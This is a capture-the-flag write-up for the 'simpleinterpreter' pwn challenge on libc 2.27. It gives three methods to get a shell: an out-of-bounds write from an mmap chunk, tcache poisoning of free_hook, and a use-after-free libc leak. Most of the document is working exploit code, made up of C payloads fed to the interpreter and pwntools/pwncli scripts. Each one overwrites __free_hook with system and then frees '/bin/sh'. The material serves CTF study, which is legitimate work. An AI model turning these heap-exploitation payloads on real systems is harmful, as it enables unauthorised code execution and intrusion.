# simpleinterpreter libc 2.27

# Reverse Engineering

# Method 1
[Reference link for method 1](https://xp0int.top/posts/2023/12/18/2023-%E5%BC%BA%E7%BD%91%E6%9D%AF-Quals-Writeup-By-Xp0int/#14-simpleinterpreter)
The program implements a C language interpreter, with the following available keywords:
```c
char else enum if int return sizeof while read close printf malloc free memset memcmp exit void main
```


```c
 read close printf malloc free memset memcmp exit 和原生C 函数效果一样
 可以尝试一下&和*操作是否存在，存在利用那么更方便
```

The vulnerability is an out-of-bounds access. First use malloc to allocate a huge chunk that lands in mmap memory, then write out of bounds into libc, overwrite free_hook with the address of system, and then free "/bin/sh" to getshell (the libc version is 2.27)

**It doesn't seem to work locally; which mmap allocation produces the obtained address is not deterministic, so the offset from the base address cannot be determined. But the range of possible mmap counts is limited, so repeated attempts may succeed**

The input code corresponding to this method is as follows

```c
main(){
int size;
char* freehook;
char* system; 
char* v;
char *binsh;
size = 204800;
binsh="/bin/sh";
v=malloc(size);
freehook=v-0xb2728;
system=v-0x450bf0;
*(int*)freehook=system;
free(binsh);
}
```
# Method 2
[Reference link for method 2](https://blog.wm-team.cn/index.php/archives/69/)

This method does not use * and &; it solves the challenge purely with the provided keywords
1.  Allocate a chunk larger than fastbin size and two fastbin-sized chunks
2.  Free the first chunk; it goes into the unsorted bin, leaking a libc address
3. Free the second and third chunks, then modify the fd of the third chunk to the address of free_hook-8
4. malloc twice
5. Modify the contents of the second chunk to /bin/sh\x00 and the address of system; at this point the content of free_hook is overwritten with the address of system
6. Free the second chunk to getshell 
```python
from pwn import *
sh = process('./simpleinterpreter')
context.log_level = "debug"
code = '''
int main()
{
    void* p1;
    void* p2;
    void* p3;
    void* p4;
    void* p5;
    p1 = malloc(0x500);
    p2 = malloc(0x18);
    p3 = malloc(0x18);
    free(p1);
    printf(p1);
    free(p3);
    free(p2);
    read(0, p2, 8);
    p4 = malloc(0x18);
    p5 = malloc(0x18);
    read(0, p5, 0x10);
    free(p5);
    return 0;
}'''

sh.sendlineafter("Code size:", str(len(code)))
sh.sendafter("Please give me the code to interpret:", code)
libc_base = u64(sh.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x3ebca0
log.success("libc_base:\t" + hex(libc_base))
free_hook = libc_base + 0x3ed8e8
system = libc_base + 0x4f420
sh.send(p64(free_hook - 8))
sh.send("/bin/sh\x00" + p64(system))
sh.interactive()
```
# Method 3
[Reference link](https://mp.weixin.qq.com/s/ksGjGGeYjvWpgmRA5xyBpg)

The difference from method 1 is only in the way the libc base address is leaked
The attack idea is to first use malloc to request a large chunk, then malloc a small chunk to prevent the large chunk from merging with the TOP chunk when freed, use the pointer UAF to read the main_arena left behind after free to calculate the libc address, and finally use the pointer to overwrite __free_hook with system and call free to getshell

```c

from pwncli import *
cli_script()
set_remote_libc('libc-2.27.so')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
# CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

payload = '''
int c;
int main(){
    int b;
    int libc;
    int* free_hook;
    char* sh;
    libc =  0 ;
    free_hook = libc + 1;
    free_hook = malloc(0x500);
    sh = malloc(0x10);
    free(free_hook);
    libc = *free_hook - 0x3ebca0;
    printf("%lx",libc);
    free_hook = libc + 0x3ed8e8;
    *free_hook = libc + 0x4F420;
    sh[0] = 's';
    sh[1] = 'h';
    free(sh);
    return 0;
}
'''
sla('size:',str(len(payload)))
sla('et:',payload)
ia()
```
